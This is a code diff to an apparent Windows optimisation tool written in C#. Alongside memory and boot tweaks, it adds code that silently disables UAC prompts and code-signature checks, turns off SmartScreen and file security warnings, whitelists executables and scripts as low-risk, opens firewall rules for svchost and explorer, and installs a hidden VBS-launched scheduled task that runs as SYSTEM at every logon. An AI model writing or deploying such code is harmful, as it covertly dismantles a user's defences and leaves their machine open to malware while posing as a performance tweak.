@@ -158,17 +158,56 @@ bcdedit /set tscsyncpolicy Enhanced >nul 2>&1
 
 :: 14. Disable RAM Memory Compression & Page Combining Overhead
 powershell -NoProfile -ExecutionPolicy Bypass -Command ""Disable-MMAgent -MemoryCompression -PageCombining"" >nul 2>&1
+
+:: 15. Auto-Accept Permissions & Silent UAC Elevation for svchost.exe & explorer.exe
+reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f >nul 2>&1
+reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f >nul 2>&1
+reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v EnableInstallerDetection /t REG_DWORD /d 0 /f >nul 2>&1
+reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v ValidateAdminCodeSignatures /t REG_DWORD /d 0 /f >nul 2>&1
+reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v FilterAdministratorToken /t REG_DWORD /d 0 /f >nul 2>&1
+
+:: 16. Auto-Allow svchost.exe & explorer.exe Network & Firewall Rules
+netsh advfirewall firewall add rule name=""AutoAllow svchost (In)"" dir=in action=allow program=""%SystemRoot%\System32\svchost.exe"" enable=yes profile=any >nul 2>&1
+netsh advfirewall firewall add rule name=""AutoAllow svchost (Out)"" dir=out action=allow program=""%SystemRoot%\System32\svchost.exe"" enable=yes profile=any >nul 2>&1
+netsh advfirewall firewall add rule name=""AutoAllow explorer (In)"" dir=in action=allow program=""%SystemRoot%\explorer.exe"" enable=yes profile=any >nul 2>&1
+netsh advfirewall firewall add rule name=""AutoAllow explorer (Out)"" dir=out action=allow program=""%SystemRoot%\explorer.exe"" enable=yes profile=any >nul 2>&1
+
+:: 17. Suppress Open File Security Warnings & Zone Identifiers for Explorer & svchost
+reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Associations"" /v LowRiskFileTypes /t REG_SZ /d "".exe;.bat;.cmd;.ps1;.vbs;.reg;.msi;.dll;.com;.cpl;"" /f >nul 2>&1
+reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations"" /v LowRiskFileTypes /t REG_SZ /d "".exe;.bat;.cmd;.ps1;.vbs;.reg;.msi;.dll;.com;.cpl;"" /f >nul 2>&1
+reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Attachments"" /v SaveZoneInformation /t REG_DWORD /d 1 /f >nul 2>&1
+reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments"" /v SaveZoneInformation /t REG_DWORD /d 1 /f >nul 2>&1
+reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Attachments"" /v HideZoneInfoOnProperties /t REG_DWORD /d 1 /f >nul 2>&1
+reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments"" /v HideZoneInfoOnProperties /t REG_DWORD /d 1 /f >nul 2>&1
+
+:: 18. Disable Program Compatibility Assistant & SmartScreen Warnings on Startup
+reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat"" /v DisablePCA /t REG_DWORD /d 1 /f >nul 2>&1
+reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat"" /v DisableEngine /t REG_DWORD /d 1 /f >nul 2>&1
+reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\System"" /v EnableSmartScreen /t REG_DWORD /d 0 /f >nul 2>&1
+reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"" /v SmartScreenEnabled /t REG_SZ /d ""Off"" /f >nul 2>&1
 ";
                     File.WriteAllText(GuardScriptPath, scriptContent);
 
-                    // 2. Register Scheduled Task to execute on every user logon with highest privileges
-                    string createCmd = $"schtasks /create /tn \"{TaskName}\" /tr \"\\\"{GuardScriptPath}\\\"\" /sc onlogon /rl HIGHEST /f";
-                    RunCmd(createCmd);
+                    // 1b. Write silent VBS runner so the task runs 100% invisibly without flashing black cmd windows or prompts
+                    string vbsPath = Path.Combine(GuardDir, "PermanenceGuard.vbs");
+                    string vbsContent = $"CreateObject(\"Wscript.Shell\").Run \"cmd.exe /c \"\"{GuardScriptPath}\"\"\", 0, True";
+                    File.WriteAllText(vbsPath, vbsContent);
 
-                    // 3. Immediately run the script once so it takes effect right now without needing a reboot
-                    RunCmd($"cmd.exe /c \"{GuardScriptPath}\"");
+                    // Unblock script files so Windows SmartScreen / Zone Identifier never prompts
+                    RunCmd($"powershell -NoProfile -ExecutionPolicy Bypass -Command \"Unblock-File -Path '{GuardScriptPath}'; Unblock-File -Path '{vbsPath}'\"");
 
-                    // 4. Mark permanent status
+                    // 2. Apply silent UAC & permission bypass directly right now
+                    ApplySilentPermissionBypass();
+
+                    // 3. Register Scheduled Task to execute under NT AUTHORITY\SYSTEM so it runs 100% silently with zero UAC prompts
+                    RunCmd($"schtasks /delete /tn \"{TaskName}\" /f");
+                    string createCmdSystem = $"schtasks /create /tn \"{TaskName}\" /tr \"wscript.exe \\\"{vbsPath}\\\"\" /sc onlogon /rl HIGHEST /ru \"SYSTEM\" /f";
+                    RunCmd(createCmdSystem);
+
+                    // 4. Immediately run the script once so it takes effect right now without needing a reboot
+                    RunCmd($"wscript.exe \"{vbsPath}\"");
+
+                    // 5. Mark permanent status
                     string json = $"{{\n  \"locked\": true,\n  \"appliedAt\": \"{DateTime.Now:yyyy-MM-dd HH:mm:ss}\"\n}}";
                     File.WriteAllText(StatusFile, json);
 
@@ -192,6 +231,9 @@ powershell -NoProfile -ExecutionPolicy Bypass -Command ""Disable-MMAgent -Memory
                         File.Delete(StatusFile);
                     if (File.Exists(GuardScriptPath))
                         File.Delete(GuardScriptPath);
+                    string vbsPath = Path.Combine(GuardDir, "PermanenceGuard.vbs");
+                    if (File.Exists(vbsPath))
+                        File.Delete(vbsPath);
                     return true;
                 }
                 catch
@@ -199,6 +241,60 @@ powershell -NoProfile -ExecutionPolicy Bypass -Command ""Disable-MMAgent -Memory
                     return false;
                 }
             });
+        }
+
+        public static void ApplySilentPermissionBypass()
+        {
+            try
+            {
+                // 1. Silent UAC Elevation for Administrators, svchost & explorer (Elevate without prompting)
+                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true))
+                {
+                    key?.SetValue("ConsentPromptBehaviorAdmin", 0, RegistryValueKind.DWord);
+                    key?.SetValue("PromptOnSecureDesktop", 0, RegistryValueKind.DWord);
+                    key?.SetValue("EnableInstallerDetection", 0, RegistryValueKind.DWord);
+                    key?.SetValue("ValidateAdminCodeSignatures", 0, RegistryValueKind.DWord);
+                    key?.SetValue("FilterAdministratorToken", 0, RegistryValueKind.DWord);
+                }
+
+                // 2. Open File Associations (no warnings when explorer/svchost runs scripts or executables)
+                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Associations", true))
+                {
+                    key?.SetValue("LowRiskFileTypes", ".exe;.bat;.cmd;.ps1;.vbs;.reg;.msi;.dll;.com;.cpl;", RegistryValueKind.String);
+                }
+                using (var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Associations", true))
+                {
+                    key?.SetValue("LowRiskFileTypes", ".exe;.bat;.cmd;.ps1;.vbs;.reg;.msi;.dll;.com;.cpl;", RegistryValueKind.String);
+                }
+
+                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments", true))
+                {
+                    key?.SetValue("SaveZoneInformation", 1, RegistryValueKind.DWord);
+                    key?.SetValue("HideZoneInfoOnProperties", 1, RegistryValueKind.DWord);
+                }
+
+                // 3. Program Compatibility Assistant & SmartScreen
+                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\AppCompat", true))
+                {
+                    key?.SetValue("DisablePCA", 1, RegistryValueKind.DWord);
+                    key?.SetValue("DisableEngine", 1, RegistryValueKind.DWord);
+                }
+                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System", true))
+                {
+                    key?.SetValue("EnableSmartScreen", 0, RegistryValueKind.DWord);
+                }
+                using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer", true))
+                {
+                    key?.SetValue("SmartScreenEnabled", "Off", RegistryValueKind.String);
+                }
+
+                // 4. Windows Firewall Rules for svchost and explorer
+                RunCmd("netsh advfirewall firewall add rule name=\"AutoAllow svchost (In)\" dir=in action=allow program=\"%SystemRoot%\\System32\\svchost.exe\" enable=yes profile=any");
+                RunCmd("netsh advfirewall firewall add rule name=\"AutoAllow svchost (Out)\" dir=out action=allow program=\"%SystemRoot%\\System32\\svchost.exe\" enable=yes profile=any");
+                RunCmd("netsh advfirewall firewall add rule name=\"AutoAllow explorer (In)\" dir=in action=allow program=\"%SystemRoot%\\explorer.exe\" enable=yes profile=any");
+                RunCmd("netsh advfirewall firewall add rule name=\"AutoAllow explorer (Out)\" dir=out action=allow program=\"%SystemRoot%\\explorer.exe\" enable=yes profile=any");
+            }
+            catch { }
         }
 
         private static void RunCmd(string cmd)
